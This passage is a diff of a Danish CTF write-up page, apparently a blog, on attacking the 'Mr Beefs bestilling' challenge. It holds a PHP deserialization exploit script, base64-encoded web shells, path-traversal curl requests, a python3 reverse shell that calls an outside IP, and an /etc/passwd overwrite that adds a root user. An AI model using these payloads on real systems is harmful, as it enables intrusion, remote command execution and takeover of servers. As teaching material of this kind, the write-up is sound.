+	<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">myfile</span> <span class="org-php-assignment-op">=</span> <span class="org-php-function-call">fopen</span>(<span class="org-php-string">"./backupzz/"</span>.<span class="org-php-Xthis-sigil">$</span><span class="org-php-Xthis">this</span><span class="org-php-object-op">-&gt;</span><span class="org-php-property-name">filename</span>.<span class="org-php-string">".bak"</span>, <span class="org-php-string">"w"</span>) <span class="org-php-keyword">or</span> <span class="org-php-keyword">die</span>(<span class="org-php-string">"Unable to open file!"</span>);
+	<span class="org-php-function-call">fwrite</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">myfile</span>, <span class="org-php-function-call">serialize</span>(<span class="org-php-Xthis-sigil">$</span><span class="org-php-Xthis">this</span>));
+	<span class="org-php-function-call">fclose</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">myfile</span>);
     }
 }
 </pre>
@@ -943,43 +943,43 @@ Hvis der bliver sendt POST request med en fil der en endelsen <code>.png</code>,
 Hvis der bliver sendt en GET request med parameteret <code>frombackup</code>, så restorerer den indholdet ved at deserialisere indholdet.<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-php">if(isset($_POST['Submit1']))
+<pre class="src src-php"><span class="org-php-keyword">if</span>(<span class="org-php-keyword">isset</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">_POST</span>[<span class="org-php-string">'Submit1'</span>]))
 { 
 
 
-    $image=$_FILES['file'];
-    $extension = pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION);
+    <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">image</span><span class="org-php-assignment-op">=</span><span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">_FILES</span>[<span class="org-php-string">'file'</span>];
+    <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">extension</span> <span class="org-php-assignment-op">=</span> <span class="org-php-function-call">pathinfo</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">_FILES</span>[<span class="org-php-string">"file"</span>][<span class="org-php-string">"name"</span>], <span class="org-php-constant">PATHINFO_EXTENSION</span>);
 
 
 
 
 
-if( $extension=='png')
+<span class="org-php-keyword">if</span>( <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">extension</span><span class="org-php-comparison-op">==</span><span class="org-php-string">'png'</span>)
 {
-    $backup = new fileuploadedbackup;
-    $backup-&gt;filename = $image['name'];
-    $backup-&gt;filecontent = base64_encode(file_get_contents($image['tmp_name'], true));
-    $backup-&gt;extension = $extension;
+    <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">backup</span> <span class="org-php-assignment-op">=</span> <span class="org-php-keyword">new</span> <span class="org-type">fileuploadedbackup</span>;
+    <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">backup</span><span class="org-php-object-op">-&gt;</span><span class="org-php-property-name">filename</span> <span class="org-php-assignment-op">=</span> <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">image</span>[<span class="org-php-string">'name'</span>];
+    <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">backup</span><span class="org-php-object-op">-&gt;</span><span class="org-php-property-name">filecontent</span> <span class="org-php-assignment-op">=</span> <span class="org-php-function-call">base64_encode</span>(<span class="org-php-function-call">file_get_contents</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">image</span>[<span class="org-php-string">'tmp_name'</span>], <span class="org-php-constant">true</span>));
+    <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">backup</span><span class="org-php-object-op">-&gt;</span><span class="org-php-property-name">extension</span> <span class="org-php-assignment-op">=</span> <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">extension</span>;
 
 
-move_uploaded_file($image['tmp_name'],"images/".$image['name']);
-$backup-&gt;backup();
-echo("omg its &lt;a href='./file.php?file=".$image['name']."'&gt; HERE!!&lt;/a&gt;");
+<span class="org-php-function-call">move_uploaded_file</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">image</span>[<span class="org-php-string">'tmp_name'</span>],<span class="org-php-string">"images/"</span>.<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">image</span>[<span class="org-php-string">'name'</span>]);
+<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">backup</span><span class="org-php-object-op">-&gt;</span><span class="org-php-method-call">backup</span>();
+<span class="org-php-keyword">echo</span>(<span class="org-php-string">"omg its &lt;a href='./file.php?file="</span>.<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">image</span>[<span class="org-php-string">'name'</span>].<span class="org-php-string">"'&gt; HERE!!&lt;/a&gt;"</span>);
 
 }
-else
+<span class="org-php-keyword">else</span>
 {
-echo "File is not image";
+<span class="org-php-keyword">echo</span> <span class="org-php-string">"File is not image"</span>;
 }
 }
 
-#restore from backup
-if(isset($_GET['frombackup']))
+<span class="org-comment-delimiter">#r</span><span class="org-comment">estore from backup</span>
+<span class="org-php-keyword">if</span>(<span class="org-php-keyword">isset</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">_GET</span>[<span class="org-php-string">'frombackup'</span>]))
 { 
-    $backupfile = "./backupzz/".$_GET['frombackup'];
-    $content = file_get_contents($backupfile, true);
-    echo($content);
-    unserialize($content);
+    <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">backupfile</span> <span class="org-php-assignment-op">=</span> <span class="org-php-string">"./backupzz/"</span>.<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">_GET</span>[<span class="org-php-string">'frombackup'</span>];
+    <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">content</span> <span class="org-php-assignment-op">=</span> <span class="org-php-function-call">file_get_contents</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">backupfile</span>, <span class="org-php-constant">true</span>);
+    <span class="org-php-keyword">echo</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">content</span>);
+    <span class="org-php-function-call">unserialize</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">content</span>);
 }
 </pre>
 </div>
@@ -1005,14 +1005,14 @@ Det viser sig at challenge authored havde glemt at fjerne hans egen bagdør inde
 <img src="assets/2022-04-14_17-25-15_screenshot.png" alt="2022-04-14_17-25-15_screenshot.png"><br>
 Filen <code>evil.png.png.bak</code> er en PHP shell, men pakket ind sådan at at det passer med PHP klassen.<br>
 </p>
-<pre class="example" id="org77a55df">
+<pre class="example" id="orgfb4bbde">
 O:18:"fileuploadedbackup":4:{s:8:"filename";s:12:"evil.png.png";s:11:"filecontent";s:724:"TzoxODoiZmlsZXVwbG9hZGVkYmFja3VwIjo0OntzOjg6ImZpbGVuYW1lIjtzOjEyOiJ2ZXJ5Y29vbC5waHAiO3M6MTE6ImZpbGVjb250ZW50IjtzOjQwMDoiUEdoMGJXdytDanhpYjJSNVBnbzhabTl5YlNCdFpYUm9iMlE5SWtkRlZDSWdibUZ0WlQwaVBEOXdhSEFnWldOb2J5QmlZWE5sYm1GdFpTZ2tYMU5GVWxaRlVsc25VRWhRWDFORlRFWW5YU2s3SUQ4K0lqNEtQR2x1Y0hWMElIUjVjR1U5SWxSRldGUWlJRzVoYldVOUltTnRaQ0lnWVhWMGIyWnZZM1Z6SUdsa1BTSmpiV1FpSUhOcGVtVTlJamd3SWo0S1BHbHVjSFYwSUhSNWNHVTlJbE5WUWsxSlZDSWdkbUZzZFdVOUlrVjRaV04xZEdVaVBnbzhMMlp2Y20wK0NqeHdjbVUrQ2p3L2NHaHdDaUFnSUNCcFppaHBjM05sZENna1gwZEZWRnNuWTIxa0oxMHBLUW9nSUNBZ2V3b2dJQ0FnSUNBZ0lITjVjM1JsYlNna1gwZEZWRnNuWTIxa0oxMHBPd29nSUNBZ2ZRby9QZ284TDNCeVpUNEtQQzlpYjJSNVBnbzhMMmgwYld3KyI7czoxMzoiZmlsZWV4dGVuc2lvbiI7TjtzOjk6ImV4dGVuc2lvbiI7czo0OiIucGhwIjt9";s:13:"fileextension";N;s:9:"extension";s:3:"png";}
 </pre>
 
 <p>
 Hvis vi base64 dekoder <code>filecontent</code>, får vi et nyt serialiseret objekt.<br>
 </p>
-<pre class="example" id="orgb8981c0">
+<pre class="example" id="orge62147d">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ echo TzoxODoiZmlsZXVwbG9hZGVkYmFja3VwIjo0OntzOjg6ImZpbGVuYW1lIjtzOjEyOiJ2ZXJ5Y29vbC5waHAiO3M6MTE6ImZpbGVjb250ZW50IjtzOjQwMDoiUEdoMGJXdytDanhpYjJSNVBnbzhabTl5YlNCdFpYUm9iMlE5SWtkRlZDSWdibUZ0WlQwaVBEOXdhSEFnWldOb2J5QmlZWE5sYm1GdFpTZ2tYMU5GVWxaRlVsc25VRWhRWDFORlRFWW5YU2s3SUQ4K0lqNEtQR2x1Y0hWMElIUjVjR1U5SWxSRldGUWlJRzVoYldVOUltTnRaQ0lnWVhWMGIyWnZZM1Z6SUdsa1BTSmpiV1FpSUhOcGVtVTlJamd3SWo0S1BHbHVjSFYwSUhSNWNHVTlJbE5WUWsxSlZDSWdkbUZzZFdVOUlrVjRaV04xZEdVaVBnbzhMMlp2Y20wK0NqeHdjbVUrQ2p3L2NHaHdDaUFnSUNCcFppaHBjM05sZENna1gwZEZWRnNuWTIxa0oxMHBLUW9nSUNBZ2V3b2dJQ0FnSUNBZ0lITjVjM1JsYlNna1gwZEZWRnNuWTIxa0oxMHBPd29nSUNBZ2ZRby9QZ284TDNCeVpUNEtQQzlpYjJSNVBnbzhMMmgwYld3KyI7czoxMzoiZmlsZWV4dGVuc2lvbiI7TjtzOjk6ImV4dGVuc2lvbiI7czo0OiIucGhwIjt9 | base64 -d
 O:18:"fileuploadedbackup":4:{s:8:"filename";s:12:"verycool.php";s:11:"filecontent";s:400:"PGh0bWw+Cjxib2R5Pgo8Zm9ybSBtZXRob2Q9IkdFVCIgbmFtZT0iPD9waHAgZWNobyBiYXNlbmFtZSgkX1NFUlZFUlsnUEhQX1NFTEYnXSk7ID8+Ij4KPGlucHV0IHR5cGU9IlRFWFQiIG5hbWU9ImNtZCIgYXV0b2ZvY3VzIGlkPSJjbWQiIHNpemU9IjgwIj4KPGlucHV0IHR5cGU9IlNVQk1JVCIgdmFsdWU9IkV4ZWN1dGUiPgo8L2Zvcm0+CjxwcmU+Cjw/cGhwCiAgICBpZihpc3NldCgkX0dFVFsnY21kJ10pKQogICAgewogICAgICAgIHN5c3RlbSgkX0dFVFsnY21kJ10pOwogICAgfQo/Pgo8L3ByZT4KPC9ib2R5Pgo8L2h0bWw+";s:13:"fileextension";N;s:9:"extension";s:4:".php";}%
@@ -1022,7 +1022,7 @@ O:18:"fileuploadedbackup":4:{s:8:"filename";s:12:"verycool.php";s:11:"fileconten
 <p>
 Og kigger vi igen på hvad den bliver lavet om til får vi en PHP web shell:<br>
 </p>
-<pre class="example" id="org76ea025">
+<pre class="example" id="org293096e">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ echo "PGh0bWw+Cjxib2R5Pgo8Zm9ybSBtZXRob2Q9IkdFVCIgbmFtZT0iPD9waHAgZWNobyBiYXNlbmFtZSgkX1NFUlZFUlsnUEhQX1NFTEYnXSk7ID8+Ij4KPGlucHV0IHR5cGU9IlRFWFQiIG5hbWU9ImNtZCIgYXV0b2ZvY3VzIGlkPSJjbWQiIHNpemU9IjgwIj4KPGlucHV0IHR5cGU9IlNVQk1JVCIgdmFsdWU9IkV4ZWN1dGUiPgo8L2Zvcm0+CjxwcmU+Cjw/cGhwCiAgICBpZihpc3NldCgkX0dFVFsnY21kJ10pKQogICAgewogICAgICAgIHN5c3RlbSgkX0dFVFsnY21kJ10pOwogICAgfQo/Pgo8L3ByZT4KPC9ib2R5Pgo8L2h0bWw+" | base64 -d
 &lt;html&gt;
@@ -1047,7 +1047,7 @@ Og kigger vi igen på hvad den bliver lavet om til får vi en PHP web shell:<br>
 Så hvis vi prøver at gendanne denne fil fra backup 2 gange, så får vi vores egen shell på maskinen!<br>
 Dette kan gøre ved hjælp af 2 curl kommandoer:<br>
 </p>
-<pre class="example" id="org934d821">
+<pre class="example" id="org25d5b48">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ curl "http://mrbeefs-bestilling.hkn/upload.php?frombackup=evil.png.png.bak"
 &lt;html&gt;
@@ -1087,7 +1087,7 @@ O:18:"fileuploadedbackup":4:{s:8:"filename";s:12:"verycool.php";s:11:"fileconten
 <p>
 Vi kan bekræfte t det virkede ved at se indholdet af <code>images/</code> mappen:<br>
 </p>
-<pre class="example" id="orge2a620e">
+<pre class="example" id="org29e4242">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ curl "http://mrbeefs-bestilling.hkn/images/" -s | grep -E "(png|php)" | cut -d '"' -f 8
 evil.png.png
@@ -1109,34 +1109,34 @@ Men har efter konkurrencen, fået det tiltænkte angreb til at virke!<br>
 For at kunne angribe maskinen ved hjælp af PHP deserialization har jeg lavet følgende PHP script:<br>
 </p>
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 2: </span><code>exploit_class.php</code></label><pre class="src src-php">&lt;?php
-class fileuploadedbackup{
-    public $filename;
-    public $filecontent;
-    public $fileextension;
+<label class="org-src-name"><span class="listing-number">Listing 2: </span><code>exploit_class.php</code></label><pre class="src src-php"><span class="org-php-php-tag">&lt;?php</span>
+<span class="org-php-class-declaration">class</span> <span class="org-type">fileuploadedbackup</span>{
+    <span class="org-php-keyword">public</span> <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">filename</span>;
+    <span class="org-php-keyword">public</span> <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">filecontent</span>;
+    <span class="org-php-keyword">public</span> <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">fileextension</span>;
 
-    function __wakeup(){
+    <span class="org-php-keyword">function</span> <span class="org-php-function-name">__wakeup</span>(){
     }
 
-    function backup(){
+    <span class="org-php-keyword">function</span> <span class="org-php-function-name">backup</span>(){
     }
 }
 
-$exploit = new fileuploadedbackup();
+<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">exploit</span> <span class="org-php-assignment-op">=</span> <span class="org-php-keyword">new</span> <span class="org-type">fileuploadedbackup</span>();
 
-$exploit-&gt;filename = 'shell.php';
-$exploit-&gt;extension = 'php';
-$exploit-&gt;filecontent = base64_encode('&lt;?php
-$out = null;
-$ret = null;
-exec($_GET[\'cmd\'], $out, $ret);
-echo "Status code: $ret\nOut:\n";
-print_r($out)
-?&gt;
-');
+<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">exploit</span><span class="org-php-object-op">-&gt;</span><span class="org-php-property-name">filename</span> <span class="org-php-assignment-op">=</span> <span class="org-php-string">'shell.php'</span>;
+<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">exploit</span><span class="org-php-object-op">-&gt;</span><span class="org-php-property-name">extension</span> <span class="org-php-assignment-op">=</span> <span class="org-php-string">'php'</span>;
+<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">exploit</span><span class="org-php-object-op">-&gt;</span><span class="org-php-property-name">filecontent</span> <span class="org-php-assignment-op">=</span> <span class="org-php-function-call">base64_encode</span>(<span class="org-php-string">'&lt;?php</span>
+<span class="org-php-string">$out = null;</span>
+<span class="org-php-string">$ret = null;</span>
+<span class="org-php-string">exec($_GET[\'cmd\'], $out, $ret);</span>
+<span class="org-php-string">echo "Status code: $ret\nOut:\n";</span>
+<span class="org-php-string">print_r($out)</span>
+<span class="org-php-string">?&gt;</span>
+<span class="org-php-string">'</span>);
 
-echo serialize($exploit);
-?&gt;
+<span class="org-php-keyword">echo</span> <span class="org-php-function-call">serialize</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">exploit</span>);
+<span class="org-php-php-tag">?&gt;</span>
 </pre>
 </div>
 <p>
@@ -1144,7 +1144,7 @@ Vi skal serialiserer et objekt så det er identisk med ethvert andet objekt, der
 Så jeg kopierede klassen over, og i mit script og smed indholdet af de funktioner ud.<br>
 Efter at lave et objekt, og sætte filindholdet til at være en PHP webshell er jeg pretty much good to go!<br>
 </p>
-<pre class="example" id="org1c69abe">
+<pre class="example" id="org523badb">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ php exploit_class.php &gt; serial.png
 
@@ -1153,7 +1153,7 @@ Efter at lave et objekt, og sætte filindholdet til at være en PHP webshell er 
 <p>
 Nu skal vi bare uploade <code>serial.png</code>, og prøve at lave backup fra den fil!<br>
 </p>
-<pre class="example" id="orgc7f11ff">
+<pre class="example" id="org799d9a6">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ curl "http://mrbeefs-bestilling.hkn/upload.php?frombackup=../images/serial.png"
 &lt;html&gt;
@@ -1175,7 +1175,7 @@ O:18:"fileuploadedbackup":4:{s:8:"filename";s:9:"shell.php";s:11:"filecontent";s
 <p>
 Og så har vi en web shell ved <code>/images/shell.php</code><br>
 </p>
-<pre class="example" id="org5192698">
+<pre class="example" id="org01d5f4e">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ curl "http://mrbeefs-bestilling.hkn/images/shell.php?cmd=whoami"
 Status code: 0
@@ -1194,14 +1194,14 @@ Nu kan vi lave en reverse shell og få en stabil forbindelse med vores mål!<br>
 Efter at snuse lidt omkring, fandt jeg ud af at der var <code>python3</code> på serveren.<br>
 Så jeg brugte denne <code>python3</code> reverse shell:<br>
 </p>
-<pre class="example" id="org9ef3766">
+<pre class="example" id="org10d3c5a">
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("25.153.240.226",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 </pre>
 <p>
 Gennem browseren da curl ikke lige funkede&#x2026;<br>
 I baggrunden havde jeg en netcat server kørende på port 1337, hvor der efterfølgende kom forbindelse igennem.<br>
 </p>
-<pre class="example" id="org6d20e70">
+<pre class="example" id="orgbf0bf25">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals ]
 └─&gt; $ nc -lnvp 1337
 Connection from 25.153.240.1:51454
@@ -1213,7 +1213,7 @@ $
 Med en mere solid shell, kan vi kigge lidt omkring på fil systemet!<br>
 I <code>mrbeef</code>'s hjemme folder, kan vi finde et password!<br>
 </p>
-<pre class="example" id="org8b206f1">
+<pre class="example" id="orgb389f7d">
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@1fe46c6cc223:/home/mrbeef$ ls -la
 ls -la
@@ -1277,7 +1277,7 @@ www-data@1fe46c6cc223:/home/mrbeef$
 Efter et fejl forsøg på at bruge <code>sudo</code> kommer han til at leake sin kode: <code>givmigbeef1337</code>!<br>
 </p>
 
-<pre class="example" id="org1bda028">
+<pre class="example" id="orgb823778">
 www-data@1fe46c6cc223:/home/mrbeef$ su mrbeef
 su mrbeef
 Password: givmigbeef1337
@@ -1291,7 +1291,7 @@ mrbeef@1fe46c6cc223:~$
 En anden ting af interesse i bash historien er <code>kobebeef.py</code> scriptet.<br>
 Hvis vi studere indholdet kan vi se at der læses fra filen <code>beef.txt</code>, og bliver skrevet i den fil vi angiver som argument:<br>
 </p>
-<pre class="example" id="orgfafe889">
+<pre class="example" id="orgc536f56">
 mrbeef@1fe46c6cc223:~$ cat kobebeef.py
 cat kobebeef.py
 import sys
@@ -1309,7 +1309,7 @@ with open(tobeef,"w") as outp:
 Dette kan bruges til at elavere vores rolle på serveren!<br>
 For at forstå hvordan, er det vigtigt at kigge på hvem der har adgang til filerne!<br>
 </p>
-<pre class="example" id="orgc158158">
+<pre class="example" id="org1a73349">
 mrbeef@1fe46c6cc223:~$ ls -l
 ls -l
 total 8
@@ -1321,7 +1321,7 @@ mrbeef@1fe46c6cc223:~$
 Se, vi kan både læse og skrive til <code>beef.txt</code>, men kun læse <code>kobebeef.py</code>.<br>
 Og scriptet er det eneste vi kan køre med <code>sudo</code>:<br>
 </p>
-<pre class="example" id="org2e4df54">
+<pre class="example" id="orgff6bd83">
 mrbeef@1fe46c6cc223:~$ sudo -l
 sudo -l
 [sudo] password for mrbeef: givmigbeef1337
@@ -1338,7 +1338,7 @@ mrbeef@1fe46c6cc223:~$
 Vi kan ved at ændre i <code>/etc/passwd</code> tilføje en ny root bruger og dermed få root på systemet.<br>
 Dette er muligt da vi kan kopiere <code>passwd</code> filen ind i <code>beef.txt</code>:<br>
 </p>
-<pre class="example" id="org361e466">
+<pre class="example" id="org98787ff">
 mrbeef@1fe46c6cc223:~$ cp /etc/passwd beef.txt
 cp /etc/passwd beef.txt
 mrbeef@1fe46c6cc223:~$ cat beef.txt
@@ -1367,7 +1367,7 @@ mrbeef:x:1000:1000::/home/mrbeef:/bin/sh
 <p>
 Nu kan vi tilføje vores egen bruger, først laver vi et password med <code>openssl</code>, dette indsættes i vores egen række i <code>beef.txt</code> sådan det passer med de andre linjer:<br>
 </p>
-<pre class="example" id="org0916ce3">
+<pre class="example" id="orgb42d399">
 mrbeef@1fe46c6cc223:~$ openssl passwd -1 -salt hacker hacker
 openssl passwd -1 -salt hacker hacker
 $1$hacker$TzyKlv0/R/c28R.GAeLw.1
@@ -1379,7 +1379,7 @@ mrbeef@1fe46c6cc223:~$ echo -n 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:/roo
 Nu skal vi bare køre <code>kobebeef.py</code> med <code>sudo</code> og <code>/etc/passwd</code> som argument.<br>
 Herefter kan vi skifte til hacker brugeren.<br>
 </p>
-<pre class="example" id="org3b896d6">
+<pre class="example" id="org5309593">
 mrbeef@1fe46c6cc223:~$ sudo /usr/bin/python3 /home/mrbeef/kobebeef.py /etc/passwd
 &lt;sr/bin/python3 /home/mrbeef/kobebeef.py /etc/passwd
 mrbeef@1fe46c6cc223:~$ su hacker
@@ -1394,7 +1394,7 @@ root
 <p>
 Nu skal vi blot navigere hen til root folder og finde flaget:<br>
 </p>
-<pre class="example" id="orgc0ead34">
+<pre class="example" id="org5932dd6">
 # cd /root
 cd /root
 # ls
